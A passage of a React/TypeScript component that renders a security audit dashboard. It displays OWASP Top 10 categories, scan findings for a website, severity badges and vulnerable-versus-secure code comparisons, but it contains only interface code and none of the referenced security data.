      <Icon className={size === 'xs' ? 'w-2.5 h-2.5' : 'w-3 h-3'} />
      {label}
    </span>
  );
}

function SeverityBadge({ severity }: { severity: Severity }) {
  return (
    <span className={`text-[10px] font-semibold uppercase tracking-wider px-1.5 py-0.5 rounded border ${SEVERITY_COLOR[severity]}`}>
      {severity}
    </span>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// Sub-components
// ─────────────────────────────────────────────────────────────────────────────

function FindingCard({ finding }: { finding: Finding }) {
  const [open, setOpen] = useState(false);
  const { icon: Icon, color } = STATUS_STYLES[finding.status];
  return (
    <div className={`border rounded-lg overflow-hidden ${
      finding.status === 'fail' ? 'border-red-500/30 bg-red-500/[0.04]' :
      finding.status === 'warn' ? 'border-yellow-500/30 bg-yellow-500/[0.03]' :
      finding.status === 'pass' ? 'border-green-500/20 bg-green-500/[0.03]' :
      'border-white/5 bg-white/[0.02]'
    }`}>
      <button
        className="w-full flex items-start gap-3 p-3 text-left hover:bg-white/[0.02] transition-colors"
        onClick={() => setOpen(o => !o)}
      >
        <Icon className={`w-4 h-4 mt-0.5 shrink-0 ${color}`} />
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-sm font-medium text-white">{finding.title}</span>
            {finding.location && (
              <code className="text-[10px] text-slate-500 bg-white/[0.04] px-1.5 py-0.5 rounded font-mono truncate max-w-[240px]">
                {finding.location}
              </code>
            )}
          </div>
          {!open && <p className="text-xs text-slate-400 mt-0.5 line-clamp-1">{finding.detail}</p>}
        </div>
        <ChevronRight className={`w-4 h-4 text-slate-500 shrink-0 transition-transform ${open ? 'rotate-90' : ''}`} />
      </button>
      {open && (
        <div className="px-4 pb-4 space-y-3 border-t border-white/5">
          <p className="text-sm text-slate-300 leading-relaxed mt-3">{finding.detail}</p>
          {finding.snippet && (
            <pre className="text-xs text-slate-300 bg-white/[0.04] border border-white/5 rounded p-3 overflow-x-auto font-mono leading-relaxed whitespace-pre-wrap">
              {finding.snippet}
            </pre>
          )}
          {finding.fix && (
            <div className="flex gap-2">
              <div className="w-0.5 bg-blue-500/40 rounded shrink-0" />
              <p className="text-xs text-blue-300 leading-relaxed"><span className="font-semibold">Fix: </span>{finding.fix}</p>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

function CodePatternCard({ pattern }: { pattern: CodePattern }) {
  return (
    <div className="space-y-2">
      <div className="text-xs font-semibold text-slate-400 uppercase tracking-wider">{pattern.label}</div>
      <div className="grid md:grid-cols-2 gap-2">
        <div>
          <div className="text-[10px] text-red-400 font-semibold mb-1 flex items-center gap-1"><XCircle className="w-2.5 h-2.5" /> Vulnerable</div>
          <pre className="text-xs bg-red-500/[0.06] border border-red-500/20 rounded p-2.5 overflow-x-auto font-mono text-slate-300 whitespace-pre-wrap leading-relaxed">{pattern.bad}</pre>
        </div>
        <div>
          <div className="text-[10px] text-green-400 font-semibold mb-1 flex items-center gap-1"><CheckCircle2 className="w-2.5 h-2.5" /> Secure</div>
          <pre className="text-xs bg-green-500/[0.06] border border-green-500/20 rounded p-2.5 overflow-x-auto font-mono text-slate-300 whitespace-pre-wrap leading-relaxed">{pattern.good}</pre>
        </div>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// Main Component
// ─────────────────────────────────────────────────────────────────────────────

export default function SecurityKB() {
  const [selected, setSelected] = useState<string>('xss');
  const [view, setView] = useState<'kb' | 'scan'>('scan');

  const active = RISK_CATEGORIES.find(c => c.id === selected) || RISK_CATEGORIES[0];

  // Summary stats
  const allFindings = RISK_CATEGORIES.flatMap(c => c.findings);
  const failCount = allFindings.filter(f => f.status === 'fail').length;
  const warnCount = allFindings.filter(f => f.status === 'warn').length;
  const passCount = allFindings.filter(f => f.status === 'pass').length;

  const overallStatus: FindingStatus = failCount > 0 ? 'fail' : warnCount > 0 ? 'warn' : 'pass';

  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="flex items-start justify-between gap-4 flex-wrap">
        <div>
          <h2 className="text-xl font-bold text-white flex items-center gap-2">
            <Shield className="w-5 h-5 text-blue-400" />
            Security Knowledge Base & Audit
          </h2>
          <p className="text-sm text-slate-400 mt-0.5">OWASP Top 10 coverage · Radiance website scan results</p>
        </div>

        {/* Score card */}
        <div className="flex items-center gap-3">
          <div className="flex gap-2 text-sm">
            <span className="flex items-center gap-1.5 px-2.5 py-1 bg-red-500/10 border border-red-500/20 rounded-lg">
              <XCircle className="w-3.5 h-3.5 text-red-400" />
              <span className="text-red-300 font-semibold">{failCount}</span>
              <span className="text-red-400/60 text-xs">fail</span>
            </span>
            <span className="flex items-center gap-1.5 px-2.5 py-1 bg-yellow-500/10 border border-yellow-500/20 rounded-lg">
              <AlertTriangle className="w-3.5 h-3.5 text-yellow-400" />
              <span className="text-yellow-300 font-semibold">{warnCount}</span>
              <span className="text-yellow-400/60 text-xs">warn</span>
            </span>
            <span className="flex items-center gap-1.5 px-2.5 py-1 bg-green-500/10 border border-green-500/20 rounded-lg">
              <CheckCircle2 className="w-3.5 h-3.5 text-green-400" />
              <span className="text-green-300 font-semibold">{passCount}</span>
              <span className="text-green-400/60 text-xs">pass</span>
            </span>
          </div>

          {/* View toggle */}
          <div className="flex bg-white/5 rounded-lg p-0.5 gap-0.5">
            <button
              onClick={() => setView('scan')}
              className={`px-3 py-1.5 text-xs font-medium rounded-md transition-all ${view === 'scan' ? 'bg-blue-500/20 text-blue-300 border border-blue-500/30' : 'text-slate-500 hover:text-slate-300'}`}
            >
              <Search className="w-3 h-3 inline mr-1" />Scan Results
            </button>
            <button
              onClick={() => setView('kb')}
              className={`px-3 py-1.5 text-xs font-medium rounded-md transition-all ${view === 'kb' ? 'bg-blue-500/20 text-blue-300 border border-blue-500/30' : 'text-slate-500 hover:text-slate-300'}`}
            >
              <BookOpen className="w-3 h-3 inline mr-1" />Knowledge Base
            </button>
          </div>
        </div>
      </div>

      {view === 'scan' && (
        /* ── SCAN OVERVIEW ─────────────────────────────────────────── */
        <div className="space-y-3">
          <div className={`p-4 rounded-xl border flex items-center gap-3 ${
            overallStatus === 'fail' ? 'bg-red-500/[0.06] border-red-500/30' :
            overallStatus === 'warn' ? 'bg-yellow-500/[0.06] border-yellow-500/30' :
            'bg-green-500/[0.06] border-green-500/30'
          }`}>
            {overallStatus === 'fail' ? <ShieldX className="w-5 h-5 text-red-400 shrink-0" /> :
             overallStatus === 'warn' ? <ShieldAlert className="w-5 h-5 text-yellow-400 shrink-0" /> :
             <ShieldCheck className="w-5 h-5 text-green-400 shrink-0" />}
            <div>
              <div className={`font-semibold text-sm ${overallStatus === 'fail' ? 'text-red-300' : overallStatus === 'warn' ? 'text-yellow-300' : 'text-green-300'}`}>
                {overallStatus === 'fail' ? 'Critical issues found — action required' :
                 overallStatus === 'warn' ? 'Warnings found — review recommended' :
                 'All checks passed'}
              </div>
              <div className="text-xs text-slate-400 mt-0.5">
                Radiance website · {RISK_CATEGORIES.length} categories · {allFindings.length} findings · {new Date().toLocaleDateString('en-HK', { day: 'numeric', month: 'short', year: 'numeric' })}
              </div>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-3">
            {RISK_CATEGORIES.map(cat => {
              const status = categoryStatus(cat);
              const Icon = cat.icon;
              const { icon: StatusIcon, color } = STATUS_STYLES[status];
              const fails = cat.findings.filter(f => f.status === 'fail').length;
              const warns = cat.findings.filter(f => f.status === 'warn').length;
              return (
                <button
                  key={cat.id}
                  onClick={() => { setSelected(cat.id); setView('kb'); }}
                  className={`text-left p-4 rounded-xl border transition-all hover:border-white/20 ${
                    status === 'fail' ? 'bg-red-500/[0.04] border-red-500/20' :
                    status === 'warn' ? 'bg-yellow-500/[0.03] border-yellow-500/15' :
                    status === 'pass' ? 'bg-green-500/[0.03] border-green-500/15' :
                    'bg-white/[0.02] border-white/5'
                  }`}
                >
                  <div className="flex items-start justify-between mb-2">
                    <div className="flex items-center gap-2">
                      <div className="p-1.5 rounded-lg bg-white/5">
                        <Icon className="w-3.5 h-3.5 text-slate-400" />
                      </div>
                      <span className="text-sm font-medium text-white">{cat.name}</span>
                    </div>
                    <StatusIcon className={`w-4 h-4 ${color} shrink-0`} />
                  </div>
                  <div className="flex items-center gap-3 mt-3">
                    <SeverityBadge severity={cat.severity} />
                    {cat.owasp && <span className="text-[10px] text-slate-600">{cat.owasp}</span>}
                    <span className="ml-auto text-[10px] text-slate-500">
                      {fails > 0 && <span className="text-red-400">{fails} fail </span>}
                      {warns > 0 && <span className="text-yellow-400">{warns} warn </span>}
                      {cat.findings.filter(f => f.status === 'pass').length > 0 && (
                        <span className="text-green-500">{cat.findings.filter(f => f.status === 'pass').length} pass</span>
                      )}
                    </span>
                  </div>
                </button>
              );
            })}
          </div>
        </div>
      )}

      {view === 'kb' && (
        /* ── KB DETAIL VIEW ────────────────────────────────────────── */
        <div className="flex gap-4 min-h-0">
          {/* Left: category list */}
          <div className="w-56 shrink-0 space-y-0.5">
            {RISK_CATEGORIES.map(cat => {
              const status = categoryStatus(cat);
              const Icon = cat.icon;
              const { icon: StatusIcon, color } = STATUS_STYLES[status];
              return (
                <button
                  key={cat.id}
                  onClick={() => setSelected(cat.id)}
                  className={`w-full flex items-center gap-2.5 px-3 py-2.5 rounded-lg text-left transition-all ${
                    selected === cat.id
                      ? 'bg-white/10 border border-white/15'
                      : 'hover:bg-white/[0.04] border border-transparent'
                  }`}
                >
                  <Icon className="w-3.5 h-3.5 text-slate-500 shrink-0" />
                  <span className={`text-xs flex-1 truncate ${selected === cat.id ? 'text-white font-medium' : 'text-slate-400'}`}>
                    {cat.name}
                  </span>
                  <StatusIcon className={`w-3 h-3 shrink-0 ${color}`} />
                </button>
              );
            })}
          </div>

          {/* Right: detail */}
          <div className="flex-1 min-w-0 space-y-5">
            {/* Category header */}
            <div className="p-5 bg-white/[0.03] border border-white/5 rounded-xl">
              <div className="flex items-start justify-between gap-4 mb-3">
                <div>
                  <div className="flex items-center gap-2 mb-1">
                    <h3 className="text-lg font-bold text-white">{active.name}</h3>
                    {active.owasp && (
                      <span className="text-[10px] font-semibold px-1.5 py-0.5 bg-blue-500/10 border border-blue-500/20 text-blue-300 rounded">
                        {active.owasp}
                      </span>
                    )}
                  </div>
                  <div className="flex items-center gap-2">
                    <SeverityBadge severity={active.severity} />
                    <StatusBadge status={categoryStatus(active)} />
                  </div>
                </div>
              </div>
              <p className="text-sm text-slate-300 leading-relaxed">{active.description}</p>
            </div>

            {/* Attack scenario */}
            <div className="p-4 bg-red-500/[0.04] border border-red-500/15 rounded-xl">
              <div className="flex items-center gap-2 mb-2 text-xs font-semibold text-red-400 uppercase tracking-wider">
                <FileWarning className="w-3.5 h-3.5" />
                Attack Scenario
              </div>
              <p className="text-sm text-slate-300 leading-relaxed">{active.attackScenario}</p>
            </div>

            {/* How to check / fix */}
            <div className="grid md:grid-cols-2 gap-4">
              <div className="p-4 bg-white/[0.02] border border-white/5 rounded-xl">
                <div className="flex items-center gap-2 mb-3 text-xs font-semibold text-slate-400 uppercase tracking-wider">
                  <Search className="w-3.5 h-3.5" />
                  How to Check
                </div>
                <ul className="space-y-2">
                  {active.howToCheck.map((step, i) => (
                    <li key={i} className="flex gap-2 text-xs text-slate-300 leading-relaxed">
                      <span className="text-slate-600 font-mono shrink-0 mt-0.5">{i + 1}.</span>
                      <span>{step}</span>
                    </li>
                  ))}
                </ul>
              </div>
              <div className="p-4 bg-white/[0.02] border border-white/5 rounded-xl">
                <div className="flex items-center gap-2 mb-3 text-xs font-semibold text-slate-400 uppercase tracking-wider">
                  <ShieldCheck className="w-3.5 h-3.5" />
                  How to Fix
                </div>
                <ul className="space-y-2">
                  {active.howToFix.map((step, i) => (
                    <li key={i} className="flex gap-2 text-xs text-slate-300 leading-relaxed">
                      <span className="text-green-500/60 shrink-0 mt-0.5">→</span>
                      <span>{step}</span>
                    </li>
                  ))}
                </ul>
              </div>
            </div>

            {/* Code patterns */}
            {active.patterns && active.patterns.length > 0 && (
              <div className="p-4 bg-white/[0.02] border border-white/5 rounded-xl space-y-4">
                <div className="flex items-center gap-2 text-xs font-semibold text-slate-400 uppercase tracking-wider">
                  <Code className="w-3.5 h-3.5" />
                  Code Patterns
                </div>
                {active.patterns.map((p, i) => <CodePatternCard key={i} pattern={p} />)}
              </div>
            )}

            {/* Findings */}
            <div className="space-y-2">
              <div className="flex items-center gap-2 text-xs font-semibold text-slate-400 uppercase tracking-wider">
                <ClipboardList className="w-3.5 h-3.5" />
                Radiance Website — Findings ({active.findings.length})
              </div>
              {active.findings.map((f, i) => <FindingCard key={i} finding={f} />)}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
